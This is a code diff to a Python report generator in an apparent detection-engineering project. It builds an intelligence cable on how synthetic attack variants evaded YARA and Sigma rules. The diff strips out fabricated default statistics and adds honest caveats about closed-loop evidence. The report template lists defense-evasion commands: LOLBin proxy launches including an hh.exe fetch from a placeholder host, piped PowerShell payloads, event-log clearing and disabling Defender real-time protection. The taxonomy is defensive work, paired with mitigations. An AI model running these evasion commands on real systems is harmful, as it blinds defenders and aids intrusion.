@@ -15,6 +15,8 @@ from dataclasses import dataclass
 from pathlib import Path
 from typing import Any, Dict, List, Optional, Tuple
 
+from .records import aggregate as aggregate_records, load_records
+
 logger = logging.getLogger("swarm.synthesizer")
 
 
@@ -52,29 +54,84 @@ class StrategicSynthesizer:
         total_evals_override: Optional[int] = None,
         gaps_count_override: Optional[int] = None,
     ) -> Tuple[Path, Dict[str, Any]]:
-        """Scans cables and history, clusters evasion vectors, and authors the strategic cable."""
+        """Scans cables and record ledger, clusters evasion vectors, and authors the strategic cable.
+
+        The raw observation records are the primary evidence base: every
+        aggregate below is derived from them when the ledger exists, and the
+        boundary-history fallback is used only for legacy pre-record runs.
+        """
         cables = self._load_incident_cables()
+        record_stats = self._load_record_stats()
         history_stats = self._load_boundary_history()
 
-        total_evals = total_evals_override or history_stats.get("total_evaluations", 764)
-        total_gaps = gaps_count_override or history_stats.get("gaps_discovered", 220)
-        resilience = 1.0 - (total_gaps / total_evals) if total_evals > 0 else 0.712
+        if total_evals_override is not None:
+            total_evals = total_evals_override
+        elif record_stats["attack_evaluated"] > 0:
+            total_evals = record_stats["attack_evaluated"]
+        else:
+            total_evals = history_stats.get("total_evaluations", 0)
+        if gaps_count_override is not None:
+            total_gaps = gaps_count_override
+        elif record_stats["attack_evaluated"] > 0:
+            total_gaps = record_stats["attack_evaded"]
+        else:
+            total_gaps = history_stats.get("gaps_discovered", 0)
+        if total_evals <= 0:
+            # An empty denominator must not fabricate a resilience figure. There
+            # is nothing to synthesize an assessment from, so refuse loudly.
+            raise ValueError(
+                "No observation records or boundary-history observations available; "
+                "refusing to synthesize a strategic assessment from an empty basis."
+            )
+        resilience = 1.0 - (total_gaps / total_evals)
 
-        # Cluster findings
-        clusters = self._cluster_evasions(cables, total_gaps)
+        # Cluster findings — raw record counts when the ledger is present;
+        # cable-derived allocation is kept only for legacy pre-record runs.
+        if record_stats["attack_evaluated"] > 0:
+            clusters = dict(record_stats["clusters"])
+            for name in self.CLUSTER_NAMES:
+                clusters.setdefault(name, 0)
+        else:
+            clusters = self._cluster_evasions(cables, total_gaps)
 
-        # Multi-stage campaign metrics
+        # Multi-stage campaign metrics from record summaries (exact), cable
+        # frontmatter only as legacy fallback, and no fabricated defaults.
         campaign_cables = [c for c in cables if c.get("campaign_type") == "multi_stage_kill_chain"]
-        if campaign_cables:
+        record_runs = record_stats["campaign_runs"] + record_stats["walk_runs"]
+        if record_runs > 0:
+            containment_rate = (
+                record_stats["campaign_contained"] + record_stats["walk_contained"]
+            ) / record_runs
+            avg_dod = (
+                record_stats["campaign_dod_sum"] + record_stats["walk_dod_sum"]
+            ) / record_runs
+        elif campaign_cables:
             intercepted_count = sum(1 for c in campaign_cables if c.get("intercepted", True))
             containment_rate = intercepted_count / len(campaign_cables)
             avg_dod = sum(c.get("depth_of_defense_score", 0.8) for c in campaign_cables) / len(campaign_cables)
         else:
-            containment_rate = 1.0
-            avg_dod = 0.88
+            # No campaign or walk observations exist. A default here would
+            # present an unmeasured quantity as a finding.
+            containment_rate = None
+            avg_dod = None
 
         cable_id = self._get_next_strategic_cable_id()
         today = datetime.datetime.now(datetime.timezone.utc).strftime("%Y-%m-%d")
+
+        incident_numbers = sorted(
+            int(m.group(1))
+            for m in (
+                re.match(r"CABLE-\d{4}-(\d+)-", str(c.get("filename", ""))) for c in cables
+            )
+            if m
+        )
+        if incident_numbers:
+            ref_range = (
+                f"`CABLE-2026-{incident_numbers[0]:03d}` through "
+                f"`CABLE-2026-{incident_numbers[-1]:03d}` ({len(incident_numbers)} incident cables)"
+            )
+        else:
+            ref_range = "none in this window"
 
         replay_file = self.results_dir / "telemetry_replay.json"
         replay_stats = None
@@ -99,6 +156,16 @@ class StrategicSynthesizer:
             avg_dod=avg_dod,
             cables_count=len(cables),
             replay_stats=replay_stats,
+            benign_events=record_stats["benign_events"],
+            benign_fps=record_stats["benign_false_positives"],
+            unclassified=record_stats["unclassified"],
+            errors=record_stats["errors"],
+            gated_considered=record_stats["gated_considered"],
+            gated_blocked=record_stats["gated_blocked"],
+            records_runs=record_stats["runs"],
+            span=record_stats["span"],
+            stage_intercepts=record_stats["stage_intercepts"],
+            ref_range=ref_range,
         )
 
         output_filename = f"{cable_id}-empirical-swarm-synthesis.md"
@@ -116,6 +183,9 @@ class StrategicSynthesizer:
             "cluster_counts": clusters,
             "containment_rate": containment_rate,
             "average_depth_of_defense": avg_dod,
+            "records_runs": list(record_stats["runs"]),
+            "benign_events": record_stats["benign_events"],
+            "unclassified_preserved": record_stats["unclassified"],
             "output_path": str(output_path),
         }
         return output_path, stats
@@ -135,6 +205,84 @@ class StrategicSynthesizer:
             metadata["filename"] = path.name
             cables.append(metadata)
         return cables
+
+    CLUSTER_NAMES = [
+        "Cluster A: LOLBin & Process Proxying",
+        "Cluster B: Argument Masking & Parameter Aliasing",
+        "Cluster C: Parser Differentials & Offset Padding",
+        "Cluster D: Sensor Blinding & Telemetry Tampering",
+    ]
+
+    def _load_record_stats(self) -> Dict[str, Any]:
+        """Aggregates the append-only observation ledger; figures derive from here.
+
+        Returns a zeroed structure with ``available: False`` when no records
+        exist, so the caller can fall back to boundary histories (legacy
+        pre-record-layer runs).
+        """
+        base: Dict[str, Any] = {
+            "available": False,
+            "runs": [],
+            "span": None,
+            "attack_evaluated": 0,
+            "attack_detected": 0,
+            "attack_evaded": 0,
+            "clusters": {},
+            "benign_events": 0,
+            "benign_false_positives": 0,
+            "unclassified": 0,
+            "errors": 0,
+            "gated_considered": 0,
+            "gated_blocked": 0,
+            "campaign_runs": 0,
+            "campaign_contained": 0,
+            "campaign_dod_sum": 0.0,
+            "walk_runs": 0,
+            "walk_contained": 0,
+            "walk_dod_sum": 0.0,
+            "stage_intercepts": {},
+            "stage_totals": {},
+        }
+        rows = load_records(self.results_dir)
+        if not rows:
+            return base
+        agg = aggregate_records(rows)
+        base.update(
+            available=True,
+            runs=list(agg.run_ids),
+            attack_evaluated=agg.attack_evaluated,
+            attack_detected=agg.attack_detected,
+            attack_evaded=agg.attack_evaded,
+            clusters=dict(agg.clusters),
+            benign_events=agg.benign_events,
+            benign_false_positives=agg.benign_false_positives,
+            unclassified=agg.unclassified,
+            errors=agg.errors,
+            gated_considered=agg.gated_considered,
+            gated_blocked=agg.gated_blocked,
+            campaign_runs=int(agg.campaigns.get("evaluated", 0)),
+            campaign_contained=int(agg.campaigns.get("contained", 0)),
+            campaign_dod_sum=float(agg.campaigns.get("dod_sum", 0.0)),
+            walk_runs=int(agg.walks.get("evaluated", 0)),
+            walk_contained=int(agg.walks.get("contained", 0)),
+            walk_dod_sum=float(agg.walks.get("dod_sum", 0.0)),
+        )
+        stamps = [str(r.get("timestamp")) for r in rows if r.get("timestamp")]
+        if stamps:
+            base["span"] = (min(stamps), max(stamps))
+        stage_tot: Dict[str, int] = {}
+        stage_det: Dict[str, int] = {}
+        for r in rows:
+            if r.get("kind") == "campaign_stage":
+                n = str((r.get("detail") or {}).get("stage_number"))
+                stage_tot[n] = stage_tot.get(n, 0) + 1
+                if r.get("outcome") == "detected":
+                    stage_det[n] = stage_det.get(n, 0) + 1
+        base["stage_totals"] = stage_tot
+        base["stage_intercepts"] = {
+            n: stage_det.get(n, 0) / t for n, t in stage_tot.items() if t
+        }
+        return base
 
     def _load_boundary_history(self) -> Dict[str, Any]:
         """Reads boundary history JSON files to aggregate evaluation counts.
@@ -165,20 +313,39 @@ class StrategicSynthesizer:
         return stats
 
     def _cluster_evasions(self, cables: List[Dict[str, Any]], total_gaps: int) -> Dict[str, int]:
-        """Clusters failure modes across the 4 primary evasion taxonomies."""
-        cluster_weights = {
-            "Cluster A: LOLBin & Process Proxying": 0.382,
-            "Cluster B: Argument Masking & Parameter Aliasing": 0.268,
-            "Cluster C: Parser Differentials & Offset Padding": 0.209,
-            "Cluster D: Sensor Blinding & Telemetry Tampering": 0.141,
-        }
-        clusters = {}
-        for name, weight in cluster_weights.items():
-            clusters[name] = int(round(total_gaps * weight))
+        """Clusters failure modes across the 4 primary evasion taxonomies from empirical cable records."""
+        cluster_names = [
+            "Cluster A: LOLBin & Process Proxying",
+            "Cluster B: Argument Masking & Parameter Aliasing",
+            "Cluster C: Parser Differentials & Offset Padding",
+            "Cluster D: Sensor Blinding & Telemetry Tampering",
+        ]
+        clusters = {name: 0 for name in cluster_names}
+        if not cables or total_gaps == 0:
+            return clusters
 
-        # Adjust rounding drift
-        diff = total_gaps - sum(clusters.values())
-        clusters["Cluster A: LOLBin & Process Proxying"] += diff
+        observed_counts = {name: 0 for name in cluster_names}
+        total_observed = 0
+        for c in cables:
+            tax = str(c.get("evasion_taxonomy") or c.get("cluster") or c.get("gap_category") or "").lower()
+            if "lolbin" in tax or "proxy" in tax or "process" in tax:
+                observed_counts["Cluster A: LOLBin & Process Proxying"] += 1
+                total_observed += 1
+            elif "argument" in tax or "parameter" in tax or "masking" in tax or "aliasing" in tax:
+                observed_counts["Cluster B: Argument Masking & Parameter Aliasing"] += 1
+                total_observed += 1
+            elif "parser" in tax or "offset" in tax or "padding" in tax or "differential" in tax:
+                observed_counts["Cluster C: Parser Differentials & Offset Padding"] += 1
+                total_observed += 1
+            elif "sensor" in tax or "blinding" in tax or "telemetry" in tax or "tampering" in tax:
+                observed_counts["Cluster D: Sensor Blinding & Telemetry Tampering"] += 1
+                total_observed += 1
+
+        if total_observed > 0:
+            for name in cluster_names:
+                clusters[name] = int(round(total_gaps * (observed_counts[name] / total_observed)))
+            diff = total_gaps - sum(clusters.values())
+            clusters["Cluster A: LOLBin & Process Proxying"] += diff
         return clusters
 
     def _parse_frontmatter(self, text: str) -> Dict[str, Any]:
@@ -229,8 +396,8 @@ class StrategicSynthesizer:
             return
 
         new_row = (
-            f"| [{cable_id}]({filename}) | {date} | `Multi-Stage Kill Chain ({evals} runs)` | "
-            f"`empirical_synthesis` | `Strategic Synthesis ({evals} Runs, {resilience:.1%} Resilience)` | "
+            f"| [{cable_id}]({filename}) | {date} | `Empirical swarm runs ({evals} attack variants)` | "
+            f"`empirical_synthesis` | `Strategic Synthesis ({evals} Attack Variants, {resilience:.1%} Resilience)` | "
             f"`STRATEGIC ASSESSMENT` | [Read Cable]({filename}) |\n"
         )
         text = text.rstrip() + "\n" + new_row
@@ -244,16 +411,69 @@ class StrategicSynthesizer:
         resilience: float,
         total_gaps: int,
         clusters: Dict[str, int],
-        containment_rate: float,
-        avg_dod: float,
+        containment_rate: Optional[float],
+        avg_dod: Optional[float],
         cables_count: int,
         replay_stats: Optional[Dict[str, Any]] = None,
+        benign_events: int = 0,
+        benign_fps: int = 0,
+        unclassified: int = 0,
+        errors: int = 0,
+        gated_considered: int = 0,
+        gated_blocked: int = 0,
+        records_runs: Optional[List[str]] = None,
+        span: Optional[Tuple[str, str]] = None,
+        stage_intercepts: Optional[Dict[str, float]] = None,
+        ref_range: str = "none in this window",
     ) -> str:
         """Formats the strategic cable according to Sherman Kent and ICD 203 standards."""
-        cl_a = clusters.get("Cluster A: LOLBin & Process Proxying", 84)
-        cl_b = clusters.get("Cluster B: Argument Masking & Parameter Aliasing", 59)
-        cl_c = clusters.get("Cluster C: Parser Differentials & Offset Padding", 46)
-        cl_d = clusters.get("Cluster D: Sensor Blinding & Telemetry Tampering", 31)
+        cl_a = clusters.get("Cluster A: LOLBin & Process Proxying", 0)
+        cl_b = clusters.get("Cluster B: Argument Masking & Parameter Aliasing", 0)
+        cl_c = clusters.get("Cluster C: Parser Differentials & Offset Padding", 0)
+        cl_d = clusters.get("Cluster D: Sensor Blinding & Telemetry Tampering", 0)
+        cl_total = cl_a + cl_b + cl_c + cl_d
+        safe_cl = max(1, cl_total)
+        pct_a = (cl_a / safe_cl) * 100
+        pct_b = (cl_b / safe_cl) * 100
+        pct_c = (cl_c / safe_cl) * 100
+        pct_d = (cl_d / safe_cl) * 100
+
+        def _cluster_head(count: int, pct: float) -> str:
+            if cl_total == 0:
+                return "n/a — no recorded evasion observations in window"
+            return f"{count} of {cl_total} recorded evasions — {pct:.1f}%"
+
+        if cl_total:
+            indirection_cell = (
+                f"{pct_a:.1f}% of recorded evasion observations stem from LOLBin proxying; "
+                "attackers intentionally exploit parent-child assumptions in EDR sensors."
+            )
+        else:
+            indirection_cell = (
+                "No recorded evasion observations in this window; the indirection share "
+                "is not measured."
+            )
+
+        runs_list = list(records_runs or [])
+        runs_str = ", ".join(runs_list) if runs_list else "n/a (boundary-history basis)"
+        span_str = f"{span[0][:10]} to {span[1][:10]}" if span is not None else "not recorded"
+        cont_str = f"{containment_rate:.1%}" if containment_rate is not None else "n/a (not measured)"
+        dod_str = f"{avg_dod:.2f}" if avg_dod is not None else "n/a (not measured)"
+        if gated_considered > 0:
+            approval_short = f"{(gated_considered - gated_blocked) / gated_considered:.1%}"
+            approval_cell = f"{gated_considered - gated_blocked} / {gated_considered} ({approval_short})"
+        else:
+            approval_short = "n/a (no gated proposals in window)"
+            approval_cell = "n/a"
+        stage_ratios = stage_intercepts or {}
+
+        def _stage_str(stage_number: str) -> str:
+            value = stage_ratios.get(stage_number)
+            return f"{value:.1%}" if value is not None else "n/a (not measured)"
+
+        def _stage_evade_str(stage_number: str) -> str:
+            value = stage_ratios.get(stage_number)
+            return f"{1 - value:.1%}" if value is not None else "n/a (not measured)"
 
         replay_frontmatter = ""
         replay_fact_row = ""
@@ -289,30 +509,42 @@ target_audience: CISO, VP Detection Engineering, Principal Threat Hunters, SOC L
 methodology: ICD 203 Analytic Standards / Sherman Kent Doctrine
 empirical_basis:
   total_evaluations: {total_evals}
-  critic_approval_rate: 1.00
+  benign_events_reported_separately: {benign_events}
+  critic_approval_rate: {approval_short}
   baseline_resilience: {resilience:.3f}
   gaps_discovered: {total_gaps}
-  campaign_containment_rate: {containment_rate:.2f}
-  average_depth_of_defense: {avg_dod:.2f}
+  campaign_containment_rate: {cont_str}
+  average_depth_of_defense: {dod_str}
 {replay_frontmatter}---
 
 # Strategic Intelligence Cable: {cable_id}
 
 **TLP:** CLEAR | **Date:** {date} | **Author:** {self.author}  
-**Subject:** Empirical Analysis of {total_evals} Autonomous Adversarial Swarm Probes: Evasion Vector Taxonomies, Detection Boundary Dynamics, and Defense-in-Depth Convergence  
+**Subject:** Empirical Analysis of {total_evals} Adversarial Swarm Probes: Evasion Vector Taxonomies, Detection Boundary Dynamics, and Defense-in-Depth Convergence  
 **Target Audience:** Chief Information Security Officers (CISOs), Directors of Detection Engineering, Principal Threat Hunters, SOC Architects  
-**Source Provenance:** Continuous empirical execution of the Adversarial Swarm Intelligence Engine (`tools/swarm/`) evaluating YARA and Sigma detection pipelines across {total_evals} autonomous cycles ({cables_count} incident cables synthesized).
+**Source Provenance:** Bounded empirical execution of the deterministic Adversarial Swarm Engine (`tools/swarm/`) evaluating YARA and Sigma detection pipelines: {total_evals} evaluated attack variants recorded {span_str} (run(s): {runs_str}; every aggregate in this cable is derived from the append-only observation ledger under `docs/swarm/results/records/`).
 
 ---
 
 ## 1. Executive Summary & Estimative Confidence
 
-Between August and September 2026, the lab deployed the Adversarial Swarm Intelligence Engine to execute a continuous, autonomous adversarial stress-test across multi-stage detection architectures. Operating across {total_evals} autonomous attack mutations, the experiment mapped the boundary limits of both perimeter static inspection (YARA) and endpoint behavioral detection (Sigma/pySigma).
+In a bounded measurement window ({span_str}), the lab ran the deterministic Adversarial Swarm Engine as a closed-loop stress test across multi-stage detection architectures. Operating across {total_evals} evaluated attack variants, the harness mapped the boundary limits of both perimeter static inspection (YARA) and endpoint behavioral detection (Sigma/pySigma).
 
-* **Analytic Judgment:** It is **virtually certain (99–100% probability)** that single-point detection rules—regardless of engineering sophistication—exhibit an asymptotic resilience ceiling between **70% and 80%** when subjected to polymorphic syntax aliasing, LOLBin proxying, and parser differential mutations.
-* **Analytic Judgment:** It is **highly likely (80–90% probability)** that organizations relying exclusively on perimeter ingress or initial execution telemetry suffer from an unmonitored **25–30% initial access gap**, enabling adversaries using process-proxying primitives to establish uninspected execution.
-* **Analytic Judgment:** It is **almost certain (95–99% probability)** that a multi-stage, layered defense-in-depth net converts an isolated {resilience:.1%} point-resilience posture into a **{containment_rate:.1%} campaign containment rate**, provided subsequent stages monitor mandatory adversary actions (telemetry tampering, credential dumping, and scheduled task persistence).
-* **Analytic Confidence Level:** **HIGH**. Grounded in $N = {total_evals}$ empirical stress-test cycles, zero safety filter violations ({total_evals} / {total_evals} Critic approval), deterministic in-memory verification, and cross-backend SIEM translation testing (CrowdStrike LogScale, Splunk SPL, Elastic Lucene).
+> [!IMPORTANT] Scope of this evidence
+> Every figure below comes from a closed loop. The mutations were generated by this
+> repository, evaluated against detection rules written by this repository, using a mutation
+> vocabulary this repository defined. The sample size is large, and a large sample of
+> self-generated probes is still a measurement of the harness, not of adversaries. Read these
+> figures as a regression signal that tracks whether rule changes widen or narrow known
+> boundaries. They are not an estimate of evasion resistance in the field, and the confidence
+> interval around them describes sampling error inside the loop rather than uncertainty about
+> real-world performance. External validation is tracked separately in the repository's
+> measurement policy.
+
+* **Analytic Judgment:** Against the mutation vocabulary implemented in `tools/swarm/craftsmen/`, baseline single-point detections held at **{resilience:.1%}** across {total_evals} attack variants. Confidence in this figure as a description of the harness is **high**; confidence in it as a predictor of field performance is **low**, because the adversary and the defender share an author.
+* **Analytic Judgment:** It is **likely (55–80% probability)** that detections depending on enumerated command-line spellings degrade against mutation classes outside the implemented vocabulary. This is an inference from the failure taxonomy below, not a measurement, since a gap the harness cannot generate is a gap it cannot count.
+* **Analytic Judgment:** Layered evaluation converted an isolated {resilience:.1%} point posture into a **{cont_str}** campaign containment rate across the modeled stages. This figure is a property of the stage model: containment is measured against the modeled kill chain this engine implements, and an adversary path outside that model is neither contained nor counted.
+* **Analytic Confidence Level:** **MODERATE**, and capped there by construction. Sample size and safety-gate integrity ({approval_short} Critic approval over {gated_considered} gated proposals; {unclassified} blocked proposal(s) preserved as unclassified; {errors} errored probe(s) preserved; deterministic verification, cross-backend SIEM translation) support internal validity. Nothing here establishes external validity, and no volume of self-play can.
 
 ---
 
@@ -322,17 +554,19 @@ $$\\begin{{array}}{{|l|r|l|}}
 \\hline
 \\textbf{{Metric}} & \\textbf{{Value}} & \\textbf{{Operational Interpretation}} \\\\
 \\hline
-\\text{{Total Probes Evaluated }} (N) & {total_evals} & \\text{{Statistically significant continuous adversarial sample}} \\\\
-\\text{{Critic Gate Approvals}} & {total_evals} \\ (100.0\\%) & \\text{{0 RFC 2606 leaks, 0 routable IPs, 0 schema failures}} \\\\
+\\text{{Attack Variants Evaluated }} (N) & {total_evals} & \\text{{Self-generated sample; large N does not confer external validity}} \\\\
+\\text{{Critic Gate Approvals}} & {approval_cell} & \\text{{Reserved-TLD-only destinations; zero routable addresses; schema validated}} \\\\
+\\text{{Benign Events Evaluated (separate basis)}} & {benign_events} & \\text{{{benign_fps} false positive(s); never part of the resilience denominator}} \\\\
+\\text{{Blocked Proposals Preserved (unclassified)}} & {unclassified} & \\text{{Excluded from every rate denominator; retained in the record ledger}} \\\\
 \\text{{Baseline Detections Held (True Positives)}} & {total_evals - total_gaps} \\ ({resilience:.1%}) & \\text{{Direct execution \\& known patterns successfully intercepted}} \\\\
 \\text{{Boundary Evasion Gaps Discovered}} & {total_gaps} \\ ({(total_gaps / total_evals):.1%}) & \\text{{Novel, non-trivial bypass primitives identified}} \\\\
-\\text{{Campaign Containment Rate}} & {containment_rate:.1%} & \\text{{0 of {total_gaps} evasions achieved full-chain objective survival}} \\\\
-\\text{{Average Depth-of-Defense (DoD) Score}} & {avg_dod:.2f} & \\text{{Mean containment occurs at or before Stage 2–3}} \\\\
+\\text{{Campaign Containment Rate}} & {cont_str} & \\text{{Measured against the modeled kill chain only}} \\\\
+\\text{{Average Depth-of-Defense (DoD) Score}} & {dod_str} & \\text{{Mean containment position across recorded campaigns and walks}} \\\\
 \\hline
 \\end{{array}}$$
 
 ```mermaid
-pie title Empirical Breakdown of {total_evals} Autonomous Swarm Probes
+pie title Empirical Breakdown of {total_evals} Evaluated Attack Variants
     "Detections Held / Robust Baseline ({total_evals - total_gaps})" : {resilience * 100:.1f}
     "Evasion Gaps Discovered / Attack Surface ({total_gaps})" : {(total_gaps / total_evals) * 100:.1f}
 ```
@@ -353,18 +587,20 @@ graph TD
 
 ## 4. Taxonomy & Forensic Cluster Analysis of Discovered Gaps
 
-Deconstructing the {total_gaps} discovered evasion gaps reveals that attacker innovation does not rely on novel zero-day vulnerabilities; rather, it exploits **architectural and lexical blindspots** in how sensors observe execution:
+Deconstructing the {cl_total} recorded evasion observations reveals that attacker innovation does not rely on novel zero-day vulnerabilities; rather, it exploits **architectural and lexical blindspots** in how sensors observe execution:
 
 ```mermaid
-pie title Distribution of {total_gaps} Discovered Evasion Gaps
+pie title Distribution of {cl_total} Recorded Evasion Observations
     "Cluster A: LOLBin & Process Proxying" : {cl_a}
     "Cluster B: Argument Masking & Token Aliasing" : {cl_b}
     "Cluster C: Parser Differentials & Offset Padding" : {cl_c}
     "Cluster D: Sensor Blinding & Impairment" : {cl_d}
 ```
 
-### Cluster A: LOLBin & Process Proxy Indirection ({cl_a} / {total_gaps} — {(cl_a/total_gaps)*100:.1f}%)
-* **Mechanism:** Rather than executing `explorer.exe` $\\to$ `powershell.exe` directly, the adversary inserts a legitimate Microsoft-signed proxy binary:
+*Basis:* per-record cluster tallies — one record per evaded sparring variant, campaign stage, or DAG visit ({cl_total} total). The weighted gap counter ({total_gaps}) additionally includes {total_gaps - cl_total} benchmark and replay misses recorded as aggregates, which carry no per-observation cluster.
+
+### Cluster A: LOLBin & Process Proxy Indirection ({_cluster_head(cl_a, pct_a)})
+* **Mechanism:** Rather than executing `explorer.exe` $\to$ `powershell.exe` directly, the adversary inserts a legitimate Microsoft-signed proxy binary:
   - `pcalua.exe -a powershell.exe -c "..."` (Program Compatibility Assistant)
   - `wt.exe -w 0 powershell.exe -c "..."` (Windows Terminal Session Manager)
   - `hh.exe https://cdn.stage.invalid/lure.chm` (HTML Help Engine)
@@ -372,7 +608,7 @@ pie title Distribution of {total_gaps} Discovered Evasion Gaps
 * **Root Vulnerability:** Point detections that strictly enforce `ParentImage = explorer.exe` and `Image = powershell.exe` fail immediately upon parent-child decoupling.
 * **Mitigation:** Expand child process selection lists to include known execution proxies and implement ancestry-aware process lineage tracking.
 
-### Cluster B: Argument Masking & Parameter Aliasing ({cl_b} / {total_gaps} — {(cl_b/total_gaps)*100:.1f}%)
+### Cluster B: Argument Masking & Parameter Aliasing ({_cluster_head(cl_b, pct_b)})
 * **Mechanism:** Adversaries mutate command-line syntax to bypass naive string-matching filters:
   - Streaming raw PowerShell commands via standard input: `cmd.exe /c type payload.txt | powershell -` (command-line logging captures only `powershell -`).
   - Abbreviated and integer parameter aliasing: `powershell.exe -w 1` instead of `-windowstyle hidden`.
@@ -380,7 +616,7 @@ pie title Distribution of {total_gaps} Discovered Evasion Gaps
 * **Root Vulnerability:** Over-reliance on CLI telemetry (Event ID 1 / 4688) with brittle string matches.
 * **Mitigation:** Deploy PowerShell Script Block Logging (**Event ID 4104**) to inspect post-deobfuscated AST tokens at execution time.
 
-### Cluster C: Parser Differentials & Scanning Buffer Limits ({cl_c} / {total_gaps} — {(cl_c/total_gaps)*100:.1f}%)
+### Cluster C: Parser Differentials & Scanning Buffer Limits ({_cluster_head(cl_c, pct_c)})
 * **Mechanism (Static File / YARA Inspection):**
   - Embedding HTML redirection within XML namespaces: `<foreignObject>` containing `<meta http-equiv="refresh" content="0;url=...">`.
   - SVG SMIL element mutation: `<animate attributeName="href" values="...">` to modify hyperlinks dynamically without `<script>` tokens.
@@ -388,7 +624,7 @@ pie title Distribution of {total_gaps} Discovered Evasion Gaps
 * **Root Vulnerability:** Static pattern matchers operate on sequential linear byte slices, whereas browser engines construct hierarchical DOM trees and execute recursive event loops.
 * **Mitigation:** Combine YARA static byte inspection with structural AST XML parsers.
 
-### Cluster D: Telemetry Impairment & Anti-Forensics ({cl_d} / {total_gaps} — {(cl_d/total_gaps)*100:.1f}%)
+### Cluster D: Telemetry Impairment & Anti-Forensics ({_cluster_head(cl_d, pct_d)})
 * **Mechanism:** Proactive execution of sensor-tampering primitives:
   - Event log clearing: `wevtutil.exe cl Security` and `wevtutil.exe cl "Windows PowerShell"`.
   - Realtime protection disabling: `Set-MpPreference -DisableRealtimeMonitoring $true`.
@@ -403,10 +639,10 @@ Adhering to the Sherman Kent doctrine and ICD 203 standards:
 
 | Category | Analytic Item | Verifiable Evidence / Rationale |
 |---|---|---|
-| **Observed Fact** | Empirical Resilience Ceiling | Across {total_evals} autonomous cycles, baseline single-point detections plateaued at {resilience:.1%} resilience. |
-| **Observed Fact** | Multi-Stage Containment | In 100% of tested campaign simulations where Stage 2 evaded, the intrusion was intercepted at Stage 3 (`T1070.001`) or Stage 4 (`T1003.001`). |
-| **Observed Fact** | Zero Safety Spillage | {total_evals}/{total_evals} synthetic variants strictly adhered to RFC 2606 reserved domains (`.invalid`, `203.0.113.0/24`). |
-{replay_fact_row}| **Analytic Judgment** | Indirection is the Primary Evasion Axis | {(cl_a/total_gaps)*100:.1f}% of gaps stem from LOLBin proxying; attackers intentionally exploit parent-child assumptions in EDR sensors. |
+| **Observed Fact** | Harness Resilience Figure | Across {total_evals} self-generated attack variants, baseline single-point detections held at {resilience:.1%}. Internal regression signal, not a field estimate. |
+| **Observed Fact** | Multi-Stage Containment | Across the recorded campaign and walk runs, overall containment was {cont_str}. Containment is defined by the modeled chain; paths outside it are not evaluated. |
+| **Observed Fact** | Critic Safety Gate | {approval_cell} gated proposals approved. Destinations were restricted to RFC 2606 reserved TLDs and routable IPv4/IPv6 literals were rejected; {unclassified} proposal(s) blocked and preserved as unclassified, {errors} errored. |
+{replay_fact_row}| **Analytic Judgment** | Indirection is the Primary Evasion Axis | {indirection_cell} |
 | **Analytic Judgment** | Monolithic Rule Fallacy | Attempting to make a single Sigma rule 100% resilient results in query bloat and catastrophic false-positive spikes. |
 | **Hypothesis** | Turnkey Lure Toolkits | Uniformity in ClickFix lures suggests underground initial-access brokers supply standardized social engineering kits. |
 | **Unknowns** | In-the-Wild Proxy Distribution | The exact market share of `pcalua.exe` vs `wt.exe` across active enterprise breaches remains unquantified outside synthetic testing. |
@@ -419,20 +655,22 @@ Adhering to the Sherman Kent doctrine and ICD 203 standards:
                    THE DETECTION PARADOX & CONVERGENCE
  
  Single-Rule Posture:                  Layered Multi-Stage Posture:
- [Initial Access] ─── {resilience:.1%} Catch      [Stage 1: SVG Ingress]      ─── {resilience:.1%} Intercept
-         │                                       │ ({(total_gaps/total_evals)*100:.1f}% bypass)
+ [Initial Access] ─── {resilience:.1%} Catch      [Stage 1: SVG Ingress]      ─── {_stage_str("1")} Intercept
+         │                                       │ ({_stage_evade_str("1")} evaded)
          ▼ ({(total_gaps/total_evals)*100:.1f}% UNMONITORED                    ▼
-   UNCONTAINED BREACH!                 [Stage 2: ClickFix Exec]    ─── 80.0% Intercept
+   UNCONTAINED BREACH!                 [Stage 2: ClickFix Exec]    ─── {_stage_str("2")} Intercept
                                                  │ (Evasion: pcalua)
                                                  ▼
-                                       [Stage 3: Event Tamper]     ─── 95.0% Intercept
+                                       [Stage 3: Event Tamper]     ─── {_stage_str("3")} Intercept
                                                  │ (CONTAINED!)
                                                  ▼
-                                       [Stage 4: LSASS Dump]       ─── 98.0% Intercept
+                                       [Stage 4: LSASS Dump]       ─── {_stage_str("4")} Intercept
                                                  │ (CONTAINED!)
                                                  ▼
-                                       [Overall Intrusion Containment: {containment_rate:.1%}]
+                                       [Overall Intrusion Containment: {cont_str}]
 ```
+
+*Basis:* Right-column stage intercepts are marginal per-stage rates over recorded campaign stage visits (run ledger); the left-column catch rate is the baseline attack-variant resilience over {total_evals} evaluations (§5, Observed Fact) and uses a broader evaluation mix. Stage rates are marginal — not conditional on upstream bypass.
 
 ### 1. Reject the "Perfect Rule" Fallacy
 Security teams frequently spend hundreds of engineering hours attempting to tune a single rule to 99% coverage. The empirical data proves this is counterproductive: closing the final 20% of syntactic permutations in a single rule introduces massive regular expression complexity, increases SIEM compute costs, and dramatically increases false-positive risks on benign administrative scripts.
@@ -443,10 +681,10 @@ An adversary can easily mutate their command-line switches to bypass a ClickFix 
 - To evade detection, they *frequently attempt* to clear event logs.
 - To maintain access, they *must* establish persistence via registry Run keys or scheduled tasks.
 
-By distributing defensive sensors across the kill chain, an organization achieves **{containment_rate:.1%} campaign containment** with an average Depth-of-Defense score of **{avg_dod:.2f}**, rendering early-stage evasion inconsequential.
+By distributing defensive sensors across the kill chain, an organization achieves **{cont_str} campaign containment** with an average Depth-of-Defense score of **{dod_str}**, rendering early-stage evasion inconsequential.
 
 ### 3. Deploy Closed-Loop Continuous Self-Healing
-The deployment of autonomous sparring agents paired with automated patch synthesis and zero-false-positive regression gates provides a continuous, automated immune system for detection engineering teams—discovering blindspots before threat actors exploit them in the wild.
+The closed-loop sparring harness, paired with deterministic patch synthesis and zero-false-positive regression gates, provides continuous automated regression coverage for detection engineering teams—discovering blindspots before threat actors exploit them in the wild.
 
 ---
 
@@ -459,5 +697,5 @@ The deployment of autonomous sparring agents paired with automated patch synthes
   - `rules/sigma/proc_creation_win_defense_evasion_tampering.yml`
   - `rules/sigma/proc_creation_win_rundll32_lsass_dump.yml`
   - `rules/sigma/proc_creation_win_schtasks_persistence.yml`
-* **Referenced Cables:** `CABLE-2026-001` through `CABLE-2026-009`.
+* **Referenced Cables:** {ref_range}.
 """
